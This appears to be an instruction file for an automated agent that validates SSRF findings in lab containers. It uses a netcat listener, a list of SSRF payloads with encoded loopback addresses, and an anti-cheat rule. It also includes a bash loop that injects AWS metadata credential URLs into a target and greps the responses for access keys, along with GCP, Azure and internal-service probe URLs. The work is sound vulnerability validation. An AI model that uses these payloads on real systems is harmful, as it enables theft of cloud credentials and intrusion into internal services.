---
name: validate-ssrf
description: Validate SSRF by injecting internal URLs to make the server connect to a local TCP listener on port 59876. Anti-cheat ensures the connection originates from the server, not the PoC script.
origin: vuln-analysis
---

# Validator: Server-Side Request Forgery (SSRF)

Confirm whether a vulnerability allows making the server send requests to internal destinations, verified by a TCP listener on port 59876.

## When to Activate

- An SSRF vulnerability needs validation during reproduction (Step 7/8)

## Prerequisites (set up before PoC execution)

```bash
# Start TCP listener on port 59876 (SSRF-specific)
docker exec -d <container> sh -c 'timeout 60 nc -l -p 59876 > /tmp/ssrf_result.txt 2>&1 &'
```

## Success Criteria

| Result | Condition |
|--------|-----------|
| **[SUCCESS]** | Listener on port 59876 receives any TCP connection AND legitimacy check passes |
| **[FAILED]** | Listener receives nothing within timeout |
| **[INVALID]** | PoC script itself connects to 127.0.0.1:59876 instead of making the server do it |

## Attack Vector Examples

The PoC must inject an internal URL through the target app's vulnerable parameter to make the **server** connect to the listener:

| Technique | Payload Example |
|-----------|----------------|
| Direct | `http://127.0.0.1:59876` |
| Localhost | `http://localhost:59876` |
| IPv6 loopback | `http://[::1]:59876` |
| Hex IP | `http://0x7f000001:59876` |
| Decimal IP | `http://2130706433:59876` |
| Zero IP | `http://0.0.0.0:59876` |
| DNS rebinding | Custom domain resolving to 127.0.0.1 |

## Cloud Metadata Server Targeting (HIGH-IMPACT — try when listener-based confirmation fails)

Cloud metadata endpoints are the highest-value SSRF targets in real deployments. When the TCP listener doesn't receive connections (e.g., outbound TCP is filtered), probe cloud metadata APIs which return HTTP responses that appear in the target app's response:

### AWS Instance Metadata Service (IMDS)

```bash
# Primary endpoint (IMDSv1 — unauthenticated GET)
SSRF_PAYLOADS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role"
    "http://169.254.169.254/latest/user-data"
    "http://169.254.169.254/latest/meta-data/hostname"
)

for PAYLOAD in "${SSRF_PAYLOADS[@]}"; do
  RESP=$(docker exec <container> curl -sf -X POST "${TARGET}/api/fetch" \
    -H 'Content-Type: application/json' \
    -d "{\"url\": \"${PAYLOAD}\"}")
  if echo "$RESP" | grep -qiE "ami-|instance-id|security-credentials|ec2|AccessKeyId|SecretAccessKey|placement|instance-type"; then
    echo "[CONFIRMED] SSRF to AWS IMDS: metadata in response"
    echo "Evidence: $(echo "$RESP" | head -c 300)"
    break
  fi
done
```

**AWS IMDS confirmation patterns** (any of these in the response = CONFIRMED):
- `ami-` (AMI ID)
- `i-[0-9a-f]{8,17}` (instance ID)
- `AccessKeyId`, `SecretAccessKey`, `Token` (IAM credentials)
- `placement/`, `instance-type`, `security-credentials/`

### GCP Metadata Server

```bash
GCP_PAYLOADS=(
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://169.254.169.254/computeMetadata/v1/"
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
)
# GCP requires Metadata-Flavor: Google header — inject it via the SSRF payload if possible
# Confirmation patterns: "access_token", "token_type", "project-id", "instance/id"
```

### Azure Instance Metadata

```bash
AZURE_PAYLOAD="http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Azure requires Metadata: true header
# Confirmation patterns: "subscriptionId", "resourceGroupName", "vmId", "location"
```

### DigitalOcean / Generic Cloud

```bash
DO_PAYLOAD="http://169.254.169.254/metadata/v1.json"
# Confirmation patterns: "droplet_id", "region", "interfaces"
```

### Two-Phase Validation Strategy

**Phase 1 (Primary)**: Use TCP listener on port 59876 — confirms raw SSRF connectivity.

**Phase 2 (Escalation)**: If Phase 1 succeeds, probe cloud metadata to demonstrate real-world impact:
- Attempt AWS IMDS → confirms credential exfiltration path
- If metadata responds → upgrade finding evidence to include credential retrieval
- If container is NOT on cloud infra → metadata probes will time out, use internal service probes instead

**Internal service probes (non-cloud environments)**:
```bash
INTERNAL_TARGETS=(
    "http://localhost:6379"              # Redis
    "http://localhost:5432"             # PostgreSQL
    "http://localhost:27017"            # MongoDB
    "http://localhost:8500/v1/catalog"  # Consul
    "http://localhost:2379/v2/keys"     # etcd
    "http://localhost:9200/_cat/nodes"  # Elasticsearch
)
```

## Legitimacy Check (Anti-Cheat)

Scan the PoC script source code. The result is `[INVALID]` if:

- The PoC script itself makes a request to `127.0.0.1:59876` or `localhost:59876`
- The PoC script opens a TCP socket to port 59876
- Any `requests.get("http://127.0.0.1:59876")` or equivalent called directly (not as a payload string passed to the target app)

**Rule**: The internal URL must be sent as a **parameter value** to the target application, which then makes the outbound request. The PoC only sends requests to the target app's public endpoint.

Example:
- VALID: `requests.post(target_url, data={"url": "http://127.0.0.1:59876"})` — URL injected as parameter
- INVALID: `requests.get("http://127.0.0.1:59876")` — PoC directly connects

## Verification

```bash
# Check if listener received any connection
result=$(docker exec <container> cat /tmp/ssrf_result.txt 2>/dev/null)
[ -n "$result" ] && echo "[SUCCESS]" || echo "[FAILED]"
```

## Confidence Scoring (1-10)

| Score | Scenario |
|-------|----------|
| 10 | TCP listener receives connection AND cloud metadata (AWS IMDS IAM credentials, GCP token) returned in response |
| 9 | TCP listener receives connection from the server, verified via connection log |
| 8 | Response contains cloud metadata (instance ID, AMI, placement) from 169.254.169.254 |
| 7 | Response contains internal service data (Redis INFO, Elasticsearch _cat, etcd keys) |
| 4-6 | URL is fetched but content is stripped; only timing differences or HTTP error codes from internal hosts |
| 1-3 | No evidence of outbound request |

**Threshold: Only mark [SUCCESS] if Confidence >= 7 AND (listener received connection OR metadata/internal service content appears in response)**

## Hard Exclusions

- SSRF controlling only the **path** (not host/protocol) is NOT a vulnerability
- SSRF in client-side JS/TS is NOT valid (can't bypass firewalls from client)


## Output: Write to results.json (MANDATORY)

After validation, write the result using the **canonical schema** (see `skills/poc-writer/SKILL.md §results.json Schema`). The `validation_result` object MUST contain exactly two fields: `marker` and `evidence`. Do NOT add extra keys.

```json
{
  "vuln_id": "VULN-001",
  "type": "<type>",
  "poc_script": "poc_scripts/poc_<type>_001.py",
  "status": "SUCCESS",
  "exit_code": 0,
  "retries": 0,
  "entry_point_used": "<entry point used>",
  "validation_result": {
    "marker": "CONFIRMED",
    "evidence": "<one sentence: what specific proof was observed — e.g., TCP listener received test_message, file /tmp/flag was written, etc.>"
  }
}
```

**Marker values**:
- `"CONFIRMED"` → success condition met AND legitimacy check passed
- `"NOT_REPRODUCED"` → no proof observed within timeout
- `"PARTIAL"` → partial evidence (e.g., server error but no marker file)
- `"ERROR"` → validation infrastructure failure

**FORBIDDEN**: Adding extra keys to `validation_result` (e.g., `anti_cheat`, `legitimacy_check`, `marker_found`, `inotify_verified`, `method`, `details`, `type`, `exit_code` inside `validation_result`). Put ALL evidence in the `evidence` string. Observed: 150+ different extra key names used across 175 production runs — none of them are valid.
